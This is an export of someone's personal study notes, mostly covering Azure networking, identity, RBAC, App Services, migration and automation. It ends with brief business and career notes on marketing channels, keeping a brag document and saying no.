after deletion of resource\nStatic addresses are the equivalent DHCP reservation\nAddress prefix comes from Vnet/subnet definitions\nAzure reserves the first 3 and last IP from the pool, so the first Ip address is .4, because 1,2 and 3 are reserved. Meaning 5 reserved in total. as 0 is always your loopback interface\nAll resources in a VNEt can communicate with the internet by default\nPrivate IP is SNAT (Source Network Address Translater) to a public IP selected by Azure.\nOutbound connectivity can be restricted via routes (Routing table) or traffic filtering (Network Security Groups).\nInbound connectivty without SNAT requires public IP\nDNS\nAzure provided DNS for basic networking (between services and such) Customer DNS Server (self hosted DNS server) Recommendations Azure Provided DNS Name resolution between role instances or VMs in the same VNET Customer-managed DNS Server Name resolution between role instances or VNs in different VNET Resolution of on-premises computes and service names from role instances or VMs in Azure Resolution of Azure hostnames from on-premises computers All VMs in a Vnet must be restarted to utalize updated DNS server settings (configured on bootup) You can also configure a DNS individually on a VM by editing the NIC settings Remember you can configure on the NIC to disabled/enabled/reassign public IP and set a fixed private IP address\nRouting\nEvery subnet has a route table, with min routes: Local Vnet : Route for local addresses (no next-hop value) On-Premises : Route for defined on-premises address space (VNet gateway is next-hop address) Internet : Rotue for all traffic destined to the internet (Internet Gateway is the next-hop address) Default routing in a subnet S2S : Site to Site BGP : Border Gateway Protocol (exchange routing among autonomous sustems on the internet) We can create User Defined Routes (UDR) Find it under \u0026ldquo;Route Tables\u0026rdquo; When creating one, you VNET peering to connect different VNETS with each others Daisy chaining does not work. so if you peer A \u0026gt; B \u0026gt; C, A and C can\u0026rsquo;t see each other. Demo TODO try those User Defined Routes, you define one, then you associate it to a subnet You can\u0026rsquo;t pair VNETS with overlapping CIDR Allow forwarded traffic : Allow traffic that did not originate from within A to be forward to B (when A -\u0026gt; B peer) You can configure this indivudally in each direction Allow gateway transit : Vnet uses VPm gateway in peered Vnet, only one VNET can have a VPN gateway configured then Network Secruity Groups (NSGs)\nNetwork filter Allows or restricts traffic to resources in your VNET Inbound en outbound rules Stateless Can be associated to Subnet or NIC (on Subnet level, this rule is applied to ALL resources in the subnet) Properties Name Protocol Destination and source port range Destination and source address range Direction (in or outbound) Priority (range 100 - 4096) (the lower, the higher the priority) Access (Allow/Deny) Default (Service) tags System provided to identity groups of IP addresses Vnet Azure Load Balancer Internet there are always default rules created An NIC can only have one NSG Hybrid Connectivity\nOptions Site to Site (S2S) -\u0026gt; Via VPN Vnet \u0026gt; VPN Gateway \u0026gt; One ore more VPN Tunnel \u0026gt; One or more On premise (multi site for more than one) S2S VPN is over IPsec/IKE (ikeEv1 or IKEv2) Required VPN device in enterprise datacenter with public IP address Must not be located behind NAT Can be used for cross-premises and hybrid configs Point-to-site -\u0026gt; P2S Connect clients to the Vnet directly Vnet -\u0026gt; VPN Gateways -\u0026gt; One or more P2S SSTP tunnels to one or more clients Secure connectiom from invididual computer No need for a VPN device or public IP OS support Windows 7, 8, 8.1, 10 and Wondows Server 2008 R2 and up Throughput up to 100 Mbps Doesn\u0026rsquo;t scale easily, only usefull for a few workstations ExpressRoute -\u0026gt; Direct connection Customers Network -\u0026gt; Partner Edge -\u0026gt; Express Route Circuit (primary and secondary connection) -\u0026gt; Microsoft Edge -\u0026gt; Internal forwarding to microsoft peerinf for Office 265 or Dynamics or else to Azure private peering to VNETS Requires /30 routes or sth Benefits Layer 3 Connectivity Connectivity in all regions Global connectivity DYnamic Ruting Built-In Redundancy Unlimited vs Metered Unlimited Speed 50 Mbps - 10 Gbps Unlimited inbound data Unlimited outbound data Higher monthly fee Metered Speed 50 Mbps - 10 Gbps Unlimited Inbound data transfer Outbound data transfer charged at a predetermined rate per GB Lower monthly fee Considerations Understand the models Unlimited vs Metered Data Understand what model you are using today to accelerate adoption Understand the differences in available port speeds, locations and approach Understand the limits that drive additional circuits Understand the providers Each offer a different experience based on ecosystem and capabilities Some provide complete solutions and management Understand the costs Connection costs can be broken out by the service connection costs (Azure) and the authorized carrier costs (telco partner) Unlike other Azure services, look beyond the Azure pricing calculator Network Watcher\nTODO : Play with it Extension you have to install Gues OS level agent that monitors the network of your VMs You can then see the topology graphically of the entire network and all network related stuff You can monitor the connection between two VMs (or other stuff?) Network Performance monitor Very detailed stuff Network Diagnostics IP Flow verify : Check if a package is allowed or denied from a VM (+ debug the Security Rules) Security Group View : Choose a NIC and you can see all the rules for that NIC and break it down where the rules come from Next Hop : You can check from a VM and target an IP address and see what the next hop would be (again debugging the routing tables) Package capture\u0026hellip; VPN debug \u0026hellip; Load Balancing\nLoad Balancer (layer 4, transport layer) Basic and Standard SKUs Service monitoring (probe instances which are unhealthy) Automatic reconfiguration (for when scaling) Hash Based Distribution + provides stickyness, so keep accessing same backend service Internal and Public Options Any application protocols Application Gateway (layer 7, application layer), works also as reverse proxy Cookie bases session affinity (user can remain same user session) Stanard Tier (traditional) or WAF Tier Can have multiple instances SSL offload (ssl is broken) End to End SSL (re encrypts) Web Application Firewall (protects agains SQL injection and typical attacks), you can then add rules obviously URL Based content routing Requires its own subnet HTTP, HTTPS and Websockets application protocols What is this SKU related to the Application Gateway? Connection draining - Don\u0026rsquo;t stop in flight reqiests/connections before a backend servers is removed from a backend pool Cookie based affinity - send requests with same cookie to same backend server Can only assign a private IP address to it if its the only App Gateway in related Vnet Sizes Page Response 6K - Small (7.5 Mbps) - Medium (13 Mbps) - Large (50 Mbps) Page Response 100K - Small (35 Mbps) - Medium (100 Mbps) - Large (200 Mbps) Traffic Manager - Global, zo DNS level Managing and Securing Identities # Domain Services Overview\n3 Major Options for Auth in AD Azure AD (AAD) -\u0026gt; Primary mechanism Modern AD service directly build for the cloud Often the same as 265 directory service Can sync with in premises directory service A \u0026ldquo;tenant\u0026rdquo; in AD is like a brand new AD isolated from others Features Enterprise Identity Solution Single Sign-On (you can reuse the same cookie sort to say, so you don\u0026rsquo;t need to keep relogging in for each app) MFA Self Service (empower users to do complete password resets, request access, \u0026hellip;.) Creating a new directory (TODO: Does that equal creating a new tenant?) Must be UUID name, as this gets a public subdomain for *.onmicrosoft.com A subscription can only be owned within one \u0026ldquo;directory/tenant\u0026rdquo;, so users from different directories cannot have access to the exact same subscription. When creating a new user, a password is created you can check, but they will be prompter to change it after login new users will get an email like \u0026lt;freetochoose\u0026gt;@direcotryname.onmicrosoft.com Guest users are supported Via the IAM of an object (like a subscription), you can assign a role so that a User, group or service principal can access that subscription/object. Tiers Free 500K Object Limit 10 Apps/user Basic Reports No SLA/group based access/password self service/branding Limited MFA Basic 10 Apps/User Basic Reports Limited MFA Premium P1 Premium P2 Privileged Identity Management -\u0026gt; Temporary switch to higher access role when necessary and then degrade again, so like temp root access Office 365 Apps (thats not one you choose) Active Directory Domain Services (ADDS) -\u0026gt; On premise solution, prob self hosted Windows server with Activey Directory Domain Services role installed on it Legacy Active Directory since Windows 2000 Traditional Kerbos and LDAP functionality Deployed on Windows OS usually on VMs Azure Active Directory Domain Services (AADDS) -\u0026gt; Manager service Provides managed Active Directory Domain Services (instead of self hosted) Allows you to consume domain services without the need to patch and maintain domain controllers on IaaS Domain Join, Group Policy, LDAP, Kerberos, NTLM; all supported Perfect for unexperienced devs with AD Need to create a dedicated subnet for this? - No, it is just recommended. To separate the IP space related to AADDS. You will need to update DNS settings for your VNet that runs AADDS Azure AD Overview\nTODO Read Article Azure AD Connect (Connects a Azure AD (cloud) and ADDS (On Premise))\nComponents Synchronization Services (create users and keep in sync and such) Filtering : Limit which objects are synced to Azure AD Default filtering : All users, contacts, groups and windows 10 users are synced Password Hash Sync : Syncs password hash of your on premise AD to the Azure AD Password writeback : Change/reset password in the cloud and write back to the on premise AD Device writeback : Allow register devices back to on premise AD Prevent accidental deletes : (by default on) Automatic upgrade : (default on for express) auto update/patch the version Password Sync Options Password Sync : Ensures user passwords ar the same in both directories (ADDS and Azure AD) Passthrough authentication : When user logs in, request is forwarded to ADDS. So Azure AD just acts as a proxy. Single Source AD FS - AD Federation services server to fully federate accross AD DS and Azure AD along with other services. Identity Federation : Linking identity across different identity systems. (related to SSO) Technologies used : SAML, OAuth, OpenID, JWT, Windows Identity Foundation Examples : Being able to login with Google Account to other services, same with FB, Microsoft, Github, \u0026hellip; Active Directory Federation Services (optional) Health Monitoring Agent that you have to install on your ADDS Signel Sign On : Using password sync or passthrough authentication (not Federation) Requires Company device with modern browser User not required to authenticate with Azure AD if they are logged on with their AD DS credentials MFA Sth you know (password) Sth you have (phone) Sth you are (Biometrics) Methods Phone call Text Message Mobile App notification Mobile app verification code (code generator like Google Authenticator) 3th party tokens Azure AD B2C\nAllow people ot login with LinkedIn/Facebook/\u0026hellip; Cloud Identity Solutions for Web And Mobile Apps Highly scalable to hundres of millions of identities Enables authentication for: Social Accounts Enterprise Acccounts Azure AD B2B\nAllowes you to collaborate with partners outside of your organization Users receive an email with a confirmation link upon invitation Imported users are \u0026ldquo;Azure AD External User Objects\u0026rdquo; Access to shared apps, resources, documents, \u0026hellip; Partners access with their own credentials Enterprise-level security Privileged Identity Managment (PIM)\nWhat ?\nA user with some admin rights. Put some control around these privileged users Visibility into users with privileged access Azure Resources Azure AD On Demand administrative access View administrator history Setup alerts Require approvals (via workflows) PIM Process\nUser, with not too much access (but should sometimes) When they need this elevated access They go through activation process (customizable) Additional Auth Approval workflow (sent to a manager or sth) Can put time restriction on it Now you have an activated user, ready to work. Requirements\nAzure AD P2 License PIM Roles\nPrivileged Role Admin : Can manage role assignments and all aspects of PIM Security Administrator : Can read security information and reports, manage config in Azure Ad and Office 365 Need to be global admin to setup PIM, this user is assigned both of the above roles. Only Privileged Role Admin can mange Azure AD directory role assignments of users. Assigned roles\nDirectory Azure AD roles Can be \u0026ldquo;eligble\u0026rdquo; or \u0026ldquo;permanent\u0026rdquo; E.g. Global Admin Resource Azure RBAC Built or custom roles E.g. Subscription admin RBAC : Role Based Access Control\nTODO : Real difference between Azure AD and AADDS\nGovernance and RBAC Controls # Role Based Access Control (RBAC)\nAzure RBAC Built in roles Owner : Full access to all resources, including the right to delegate access to others. Contributor : Can create and manage all types of Azure resources, but cannot grant access to others. Reader : Can view existing Azure resources, but cannot performan any actions against them Other Roles (some examples) API Management Service Contributor - Can manage API management service and the APIS API Management Service Operator Role - Can manage API management service, not not the APIS themselves. API Management Service Reader Role - Read-only access to API management service and the APIS. Application Insights Component Contributor - Can manage Application Insights components Automation Operator - Able to start, stop, suspend and resume hobs Backup Contributor - Can manage backup in Recovery Serices vault Backup Operator - Can manage backup except moving backup in Reovery services vault Backup reader - Can view all the backup management services Roles include various actions Action defines what type of operations you can perform on a given resource type Write enables POST, PUT, PATCH, DELETE Read enables GET Use PowerShell to get latest roles Get-AzureRMRoleDefinition RBAC Custom Roles Create if none of built in works for you Each tenant can have 2000 roles Use \u0026ldquo;Actions\u0026rdquo; and \u0026ldquo;NonActions\u0026rdquo; Assignable scopes Subscriptions Resource Groups Individual Resources Example { \u0026#34;name\u0026#34; : \u0026#34;my-role-name\u0026#34;, \u0026#34;Description\u0026#34; : \u0026#34;My Description\u0026#34;, \u0026#34;Actions\u0026#34;: [ \u0026#34;Microsoft.Storage./*/read\u0026#34;, \u0026#34;Microsoft.Compute/VirtualMachines/start/action\u0026#34; ], \u0026#34;NotActions\u0026#34; : [], \u0026#34;AssignableScopes\u0026#34;: [\u0026#34;my-subscription\u0026#34;] } User rights\nResulting rights are the union of a user and the roles. Azure Policies\nEnforce governance Built in or custom code Assigned to subscriptions or resource groups (not specific resources) Create a policy and then assign it So this is an alternative approach from RBAC ? Seems to be some logical/coded limitations, like don\u0026rsquo;t allow regions to be deployed in, as you can\u0026rsquo;t do that with a role Example { \u0026#34;if\u0026#34;: { \u0026#34;not\u0026#34;: { \u0026#34;field\u0026#34; : \u0026#34;location\u0026#34;, \u0026#34;in\u0026#34; : \u0026#34;[parameters(\u0026#39;listOfAllowedLocations\u0026#39;\u0026#39;)]\u0026#34; } }, \u0026#34;then\u0026#34;: { \u0026#34;effect\u0026#34; : \u0026#34;Deny\u0026#34; } } Azure Resource Locks\nMechanism for locking down resources you want to ensure to have an extra layer of protection before they can be deleted. 2 options CanNotDelete : Authorized users can read and modify but not delete the resource ReadOnly : Authorized users can read the resource but cannot update or delete can be done on Subscription, resource group or specific resource Create and Deploy Apps # App Services Overview # PaaS for apps\nTypes\nWeb Apps Build and host apps with various languages Auto scale HA DevOps features Mobile Apps Build mobile device backend HA High Scalabale Build native apps for iOs, Android, Windows, Cross platform Shares same APp service deployment ro reduce run rates Logic Apps Automate business processes and workflows Use the orchestration engine to build a solution Examples Every time your app calls an API do some task Routinely ingest data from a storage blob or external Saas Service Regulary check Tweets or #Slack messages from a specific account API App Allow us to easily create, consume and call APIS Option to use APIs you create Could also be from external API services Security Features\nFeatures run on isolated VN ISO, SOC, and PCI Compliant Fully integrated Azure AD Managed Service Identity Support custom domains, SSL/TLS, including custom certificates using wildcards or subject alternate name Supports multiple auth protocols: OAuth, OpenId, and Microsoft AD Integrates with WAF DevOps Features\nCI/CD Support IDE Tool integration Deployment Slots - Stage environemnt for example and flip it to prod App Service Plans Overview\nFirst define the following Subscription the plan belongs to Location (region) Pricing Tier (Free, Shared, Basic, Standard Premium, Isolated) Instance size (small, Medium, Large) Then configure settings Scale count Scale rules - Allow auto sclae if plan allows it Scale up - Increase resources associated with the App Service Plan (auto switch the plan that you defined at start) So scale rules to scale the pricing plan App Service Plan Pricing Tiers\nFree (shared compute resources - runs on same VM as some other apps, so even other customers) Shared (shared compute resources - runs on same VM as some other apps, so even other customers) Basic (dedicated compute resources) Standard (dedicated compute resources) Premium (dedicated compute resources) Isolated (dedicated compute resources) - Dedicated VMs on Deciated network, max scale and isolation Comes with SLA\u0026rsquo;s A plan might have a limited amount of Apps (free 10, Shared 100, after, unlimited) Max Instances (0, from basic 3 to more) SLA (free and shared have none, others 99.95%) Functions only starting basic Auto scale only starting with basic Guideliness Create a plan for a specific applications Deploy app servies to support the application Do not use a single plan for every web app Combine app services vs mass VM creation Combine other services in the same resource group A plan is something you deploy first before deploying apps on it App Service Environments (ASEs)\nFully isolated environment For high performing apps - high CPU and/or memory Individual or multiple services plans 2 ways to deploy: Internal (internal load balancer, so internal access) or External (internet facing) Create in a subnet of a Vnet , which acieves isolation May you take a few hours to spin up Management Tools\nManagement Portal Kudu Visual Studio PowerShell CLI App Service Plan Metrics\nCPU % : Avg CPU used across all instances of the plan Memory % : Avg memory used across all instances of the plan Data In : Av income bandwith used across all instances of the plan Data Out : Av outgoing bandwith used across all instances of the plan Disk Queue Length : Avg of both read and write requests that were queued on storage. High disk queue indicates of an app that might slow down due to excessive disk I/O HTTP Queue Length : Avg of HTTP requests that sit in queue before being fulfilled. High queue is symptom of a plan under heavy load Free and Shared App Quotes\nCPU (short) - CPU allowed for this app in a 5min interval. Resets every 5 min. CPU (day) - CPU allowed for this app in a day. Resets at mignight UTC Memory - Total memory allowed for this app Bandwith - Total bandwith allowed for this app in a day. Resets at mignight UTC Filesystem - Total amount of storage allowed Results of exceeding quote\nCPU - App stopped until quote resets. During this time, all requests get a 403 Memory - App restarts Bandwith - App stoped until quote rests. During this time, all requests get a 403 Filesystem - Write operations will faill (including logs) Azure Web App Diagnostic Logs\nWeb Server\nWeb Server logging (requests) Detailed Error Message Failed Request Tracing (detailed info regarding failed requests) Application\nlevels Error, Warning, Information, Verbose Logs and locations\nType : Application Logs - Application/ Failed Request Traces - W3SVC###########/ Detailed Error Logs - DetailedErrors/ Web Server Logs - http/RawLogs Deployment Logs - /Git Creating Alerts in Application Insights, metric types\nMetric - A metric crosses a threshold for a period of time Web Tests - A site is not available or responding slowly Proactive diagnostics - Triggered when something out of the ordinary occurs KUDU - Fast analytics on fast data\nApplication Settings\nSetting - summary - Default - other options .NET - .NET version - v4.5 - v3.5 PHP - version - v5.5 - OFF, v5.6, v5.7, v7.0, v7.1 JAVA - version, web container option to choose Tomacat or Jetty - OFF - Java 7, 8 PYTHON - python version - OFF - v2.7, v3.4 Platform - 32 or 64bit mode (free and shared only have 32bit) - 32bit - 32bit Web Sockets - enable websockets - OFF - ON Always On - Unload on Idle (only basic and standard?) - OFF - ON Auto-Swao - Swap slot into prod when code pushed to it - ON - OFF Connection Strings Configure db connectiong strings per slot Variable instead of configuration file Secure as it\u0026rsquo;s not stored in a file Prefixes SQLCONNSTR_ MYSQLCONNSTR_ SQLAZURECONNSTR_ CUSTOMCONNSTR_ Handler Mappings Define for a file extension, which script process to execute them. Virtual Applications and Directories Create subdirectories with specialized sub apps Virtual Directory (URL path) \u0026gt; Physical Path \u0026gt; Application or not Custom Domains obviously Deployment slots\nAllow you to deploy in on production slots Applies to WebApps, API and Mobile Apps (not logic apps of whatever!) Reduces risk and increase speed Are live running apps Staging slot can be seamlessly be swapped to prod Seamlessly reverse back to staging if needed Swapped vs Not Swapped Settings Swapped (what is being swapped) General Settings (framework version ,32/64 bit, \u0026hellip;) App settings (can be configured to stick to a slot) Connection Strings (can be configured to stick to a slot) Handler mappings Monitoring and diagnostic settings WebJobs content What is not swapped Publishing endpoints Custom domain names SSL certificates and bindings Scale settings Webjobs schedulers When you swap You basically staging and production, it swaps the apps (Prod becomes the staging one, and the staging one becomes the prod one) Serverless Computing # What is Serverless ? Only pay what you use, flexible to scale, stitch stuff together, fully managed Types Azure Functions Languages : C#, F#, Java and JavaScript Pay per use pricing Consumption Plan App Service Plan (Run on the same plan as other services, not sure how that works) Integrated Security with OAuth providers Code in the portal or deploy via DevOps tools Function App Requires global unique name again Choose OS (JUST WHY ? ITS SERVERLESS) With Linux version you can publish code or docker image needs a storage account where you will save it A function app is a grouping of multiple functions Logic Apps (if this then that, workflow/steps like in AWS) Workflow engine Used to orchestrate and stitch together functions and services (Just like regular orchestration tools) Visualize, Design, Build, Automate Triggers -\u0026gt; Actions You have an event that happens, which fires of an action Even Grid First you create a \u0026ldquo;topic\u0026rdquo;, so you can then tell which services subscribe to the topic, so pub/sub This is where you assign subscribers Event Hub Push a LOT of events, high performance (can use Kafka), more for streaming for IoT ? TODO Read a bit more about it ? You can stream the audit log of AD to a Event Hub Design and Develop Apps that run in Containers # Install Docker Demo : Whatevs Prepare App for AKS Demo Checkout the Azure examples github repo yml files and try to deploy one Link Server Migrations # Azure Migrate # Migrate On Premise to Azure Cloud\nAssesses Azure Readiness\nAre my machines capable of running on Azure? Are there specific compatibility issues that need to be addressed? Sizing\nGet approximate sizing recommendation based on historic performance (So it would check if you 8core was over provisioned) Cost estimation\nBased on the sizes selected Dependency Mapping\nVisualize dependencies in order to plan waves of workloads for migration appropiately Waves, because you won\u0026rsquo;t deploy it all at once vCenter is your VM server managment from VMWare\nHow it works\nYou download the appliance and install it on your on premise solution (vCenter) For now \u0026ldquo;One-time discovery\u0026rdquo;, in preview is \u0026ldquo;continious discovery\u0026rdquo; This collector is downloaded as OVF template (.ova file), about 10-11Gb The collector will run as a VM in your vCenter server Go to VMWare sphere Web Client Actions \u0026gt; Deploy OVF template Select local file that you downloaded \u0026gt; next Choose a folder where you wanna put it, give a name Select a resource, so the VMWare host that will run it in your cluster, or just the cluster (auto assign) Review Where to place it on storage (thin - dynamic allocation, thick preallocate) Choose Network and finish RDP in that collector VM, on localhost you can do finalize the setup with a ProjectId and Project Key from the Migrate project Start the discovery, all required raw metadata is sent to a \u0026ldquo;collector VM\u0026rdquo; All that raw date is processed by Azure migrate Service After processing, results are shown in Azure migrate Portal where you can create an assessment based on that Limitations :\nVMware assesment only (for Hyper-V use ASR deployment planner) Up to 1500 VMs in a single discovery and project. For larger environments, split the discovery into multiple assesments. You can execute up to 20 projects per subscription. Project can only be created in the US regions. Metadata is stored in West Central or East US. What does into an Assessment?\nTarget Location : Target region Storage Type : Determines whether to use Standard or Premium disks. For performance-based sizing, the disk sizing recommendation is done based on the performance data of the VMs. Sizing Criterion : Based on performance history or as is on premises VMs Azure Hybrid Benefit : Determine if you have licensing that you can utilize for Azure Hybrid Benefit Reserved Instances : Whether to utilize reserved instances to further reduce costs. VM Uptime : The duration for which VMs will run in Azure. (should run always or just specific times) Pricing Tier : Pricing tier of VMs Performance History : By default, evaluates the performance history for the last day with 95% precentile value of the on premise machines. VM Series : Choose VM series types you want to include Comfort Factor Azure Migrate considers a buffer (comfort factor) during assessment. The buffer is applied on top of machine utilization data for VMs (CPU, memory, disk and network). The comfort factor accounts for issues such as seasonal usage, short performance history, and likely increases in the future usage. E.g. a 10core VM with 20% utilization normally results in a 2core VM. However, with a comfort factor of 2.0x the result is a 4core VM instead. The default comfort setting is 1.3x It will always round up to the next VM type. For example if you have 2.3core or 3core, it rounds up to 4core. Port requirements Collector \u0026gt; Azure Migrate Service : 443 Collector \u0026gt; vCenter Server : 443 (can be changed) On Premise VM \u0026gt; Log Analytics Workspace : 443 You can create multiple assessments When creating an assessment, you can go to assesment properties, that\u0026rsquo;s where you can set all afforementioned assessment details Azure Site Recovery (ASR) # Quick recap on Business Continuity Strategies\nHA - Run instances on different places - Proactive Disaster Reovery (run apps in secondary datacenter IF error occurs) - reactive Backup - Restore data Overview\nOn-premises to Azure Recovery : On-Premise VMware and Hyper-V to Azure replication Azure to Azure Recovery : Recover workloads from Primary region in a Secondary targer region (in case a region fails) Automation and Orchestration : Setup recovery plans to customer which services are restored, as well any subsequent scripts Rich integration into Azure automation for additional automation requirements RTO and RPO Targets : Continious replication for Azure from VMWare and Hyper V Replication frequency 30 sec 5 min 15 min VMware to Azure Recovery ASR Process Converts VM (vmd file) to VHD Upload to Azure Migration completed from recovery vault VMWare migration Prepare Azure Verify Account Permissions Can you create a VM in selected Resource Group Can you create a VM in selected Network Can you write to the selected Storage account Recommended to use a Generap Purpose v1 Create Storage Account Create Recovery Services Vault Setup an azure network Prepare VMWare VMware permissions Prepare an account for Mobility service installation Verify compatibility Prepare connectivity to Azure VMs (VPN ? Jumpbox ? \u0026hellip;) Setup Recovery You install like before with a ova file a VM that will run the on premise logic. Once installed, RDP in it and follow the setup Login to azure, choose subscription, reovery services vault, \u0026hellip; RPO : Recovery Point Objective (max amount of time you might have lost) TODO : Check out what the recovery options are Automation # VM Custom Images # Custom Images\nDIY Image Windows - Sysprep Linux - sudo waagent / deprovision + user Generalize in Azure Create Image Marketplace Images\nProvided for you in the Azure Marketplace Properties Publisher Offer SKU (Stock Keeping Unit) Create Custom Image (windows example)\nStart c:/Windows/System32/Sysprep.sysprep.exe \u0026ldquo;Enter System Out-of-Box Experience (OOBE)\u0026rdquo; [] Generalize checkbox -\u0026gt; if not checked, any VM created of this image won\u0026rsquo;t start Shutdown options : Reboot When you \u0026ldquo;capture\u0026rdquo; and image of a VM (at least with linux), you\u0026rsquo;re not able to use this VM anymore.\nFrom that Image you can build directly a VM\nDSC Overview # Introduction to Configuration Management\nEnterprise level configuration management for multiple nodes Puppet Chef Smaller size PowerShell (of f*cking bash?) PowerShell DSC : Desired State Configuration\nSpecify configuration of a machine decleratively (like a docker-compose.yml-ish) Specific for Windows machines again Key Components Configurations -\u0026gt; Declaritive powershell scripts that define the instances of the resources Resources -\u0026gt; The resource itself (contain the code to keep a resource in a specific state, so the adapter for the specific resource) Logical Configuration Manager (The engine that tries to keep the state, like k8s engine) Example Command\n\u0026gt; Publish-AzureRmVNDscConfiguration -ConfigurationPath \u0026lt;your-declarative-powershellfile\u0026gt; -OutputArchivePath somefile.zip Here you publish the declartive part into some zip file with all desires files?? I guess ? (like IIS and.NET ?) To use this now, Go to a VM Settings \u0026gt; Extensions Add -\u0026gt; Powershell DSC Select here the published archive from the first command Custom Script Extension # Execute VM Tasks without logging into the VM Upload via Portal or download scripts from Azure Blob storage or GitHub These are scripts that run POST configiration. It can download the scripts from Blob Storage and then run them for further setup. Can be automated using PowerShell Benefits No local or domain credentials needed to login to Azure VM VM does not need an accessibly IP to internet Simple to implement Drawbacks Must be enabled for each VM you want to run your script on. VMs will need internet access if using GitHib or Blob storage for scripts. Relatively Slow PowerShell VM Commands # New Resource Group : NewAzureRmResourceGroup -Name \u0026lt;myResourceGroup\u0026gt; -Location \u0026lt;EastUS\u0026gt;\nNew Virtual Machine : New-AzureRmVM \\ -ResourceGroupName \u0026#34;\u0026lt;...\u0026gt;\u0026#34; -Name \u0026#34;\u0026lt;...\u0026gt;\u0026#34; -Location \u0026#34;\u0026lt;...\u0026gt;\u0026#34; -VirtualNetworkName \u0026#34;\u0026lt;...\u0026gt;\u0026#34; -SubnetName \u0026#34;\u0026lt;...\u0026gt;\u0026#34; -SecurityGroupName \u0026#34;\u0026lt;...\u0026gt;\u0026#34; -PublicIpAddressName \u0026#34;\u0026lt;...\u0026gt;\u0026#34; -OpenPorts \u0026#34;\u0026lt;...\u0026gt;\u0026#34; Create VM Configuration : NewAzureRmVMConfig -VMName \u0026lt;...\u0026gt;\nStart and Stop VMs Start-AzureRmVM Stop-AzureRmVM More\u0026hellip; TRY THIS\nARM Templates # Apply infrastructure as code\nDeclare Azure Resources in JSON (cloudformation in AWS)\nDownload templates from Azure Portal\nAUthor new templates\nUse quickstart templates\nFound on azure docs and githib File Types\nARM Template file (JSON) ARM Template Parameter File (separate your parameters optional) Deployment Scripts ARM Template Constructs\nParameters : Define the inputs to pass in ARM during deploying Variables (for reusing) : Resources : Define the resources to deploy or updated Outputs : Values tha are returned after the ARM deployment is complete (e.g. output public IP address) Notice that you saw these things during the deploy of a VM { \u0026#34;$schema\u0026#34;: \u0026#34;...\u0026#34;, \u0026#34;contentVersion\u0026#34;: \u0026#34;1.0.0.0\u0026#34;, \u0026#34;parameters\u0026#34; : { \u0026#34;skuName\u0026#34; : { \u0026#34;type\u0026#34; : \u0026#34;string\u0026#34; } }, \u0026#34;variables\u0026#34; : {}, \u0026#34;resources\u0026#34; : [], \u0026#34;outputs\u0026#34; : {} } ARM Linking Templates # You can link templates for reusability and flexibility.\nMain Template\nOptional Resource Template Shared Resource template Member Resource temlate Methods\nInline : Create entire ARM template in body of existing template External : Link to an external template with an INLINE or EXTERNAL parameter set. Key ARM Functions\nCopy - Declare resource and copy it copyIndex() - Copy f dependsOn - Variable depends on another example \u0026quot;name\u0026quot; : \u0026quot;[concact(copyIndex(), 'storage, uniqueString(resourceGroup(),id))]\u0026quot; TODO ! Learn some ARM code for templates # Think which part of the Azure automation makes sense to \u0026ldquo;start P9 on windows server\u0026rdquo; # Azure Runbooks # Automated workflows (various tasks) that you do often\nCreate a Automation account Fill out Runbook can bound to webhook or schedule easily\nAzure Automation DSC # You can define, then compile a DSC, then apply it to multiple VMs and immediatly see if all of those VMs are Compliant or not Azure Files # Go to a storage account (or create) Click on \u0026ldquo;files\u0026rdquo; in file servcie Create a file share \u0026gt; Name and Quota Remember, this is like EFS on AWS. So you can attach such file share to different VMs and any other\nAzure File Sync # How to cache some files when using Azure files, which is a centralized file service. Service/app you install on a Windows Server VM on premise This turns your VM as a cache of Azure FIle share in your premise Use Azure File Sync to centralize your organization\u0026rsquo;s file shares in Azure Files, while keeping the flexibility, performance, and compatibility of an on-premises file server. Azure File Sync transforms Windows Server into a quick cache of your Azure file share. You can use any protocol that\u0026rsquo;s available on Windows Server to access your data locally, including SMB, NFS, and FTPS. You can have as many caches as you need across the world.\nPrereq : Azure File Share in same region where to deploy Azure File Sync Windows Server instance (on prem) Powershell Self study notes # Directory + global subscription : Set for the portal which directory/subscription to only show "},{"id":4,"href":"/business/","title":"Business","section":"","content":" Business # The Marketing Process # Source: (Bussines Model Canvas) The key 5 questions # How will potential customers discover how you can help them? How will they decide whether to buy your service? How will they buy it? How will you deluver what customers buy? How will you follow-up to make sure customers are happy? Why Channels are so crucial # You must define how you help to communicate how you help. You must communicate how you help to sell how you help. You must sell how you help in order to get paid for helping. "},{"id":5,"href":"/career/","title":"Career","section":"","content":" Career # General Tips # âLet me take care of thatâ are the golden words to tell someone. Disregarding the size of it. You will get noticed for taking care of things, that attitude, and getting things done. Communication and networking are the true difficult skills that create impact. Your network determines your influence and (potential) impact. Network! Within your organization there should is no reason to not reach out to other employees for a coffee chat/meet-n-greet. Brag Document / Work Log # Keep document that you continuously amend (like a diary) where you track your smaller and greater achievements and successes at work. This allows you to:\nReflect on your achievements and how you spend your time at work. What work do you feel most proud of? What do I wish to do more/less off? Which projects hade the effect I wanted ? Or not ? What can I do better next time? What did I struggle with? How can I grow? What is the impact of my work? How am I doing regarding any goals I set for myself? Have a documented track record of you achievements Share with your leadership your achievements at any given time (especially during performance reviews and salary renegotiations), remember, your leadership is usually not fully aware of all the work you do and results deliver. When the time comes for a performance review, your memory might draw blank and you have little memory of the work you did. Your manager also manages other people, they will not remember all of your work. Good data gives your manager the tools to justify to others your promotion or salary increase. When you get a new manager a few months before the big performance review, they won\u0026rsquo;t have any knowledge about your recent work. Reflect on what skills you have or gained (see Discover your skills on a more details) Share during a job interview or job applications about relevant achievements that are relevant for the job. Look back and be proud of what you have achieved. Try to update the document once every week or two, but eventually find a frequency that works for you, but allows you to not forget any relevant topics.\nImportant # Consider documenting also the little things you do, now you can reflect on how you spend time at work. Code Reviews, making a process easier, create more automation. Consider documenting the direct impact for each of the things you write down, now you can reflect on the impact of your work. Maybe you spend a lot of time spend on low impact work. Not ideal! Consider documenting anything quantifiable through metrics, insights, KPIs, now you can quantify the impact of your work. Consider documenting and side effects, n-tier impact of your work. Maybe your work has resulted in shorter sales cycles for the company, as a result of your automation project which allows for faster building of PoC\u0026rsquo;s. Think about business areas and processes that gained advantage. Did it save any money? Did it generate any money? It\u0026rsquo;s really great for yourself and when talking to others, to know how have an impact on more than your direct surrounding. Consider documenting what you have learned of which skills you gained or honed during certain work. Links # Julia Evans\u0026rsquo;s blog on Brag Document Bag Document: Bragdocs.com Saying No # Before saying no, ask more questions\nWhat are you asking? Whom else have you asked? When you say this is urgent, what do you mean?\u0026quot; If I couldn\u0026rsquo;t do all of this, but just a part, what part would you have me do? What do you want me to take of my plate to so I can do this? This might result in having a better scope, no 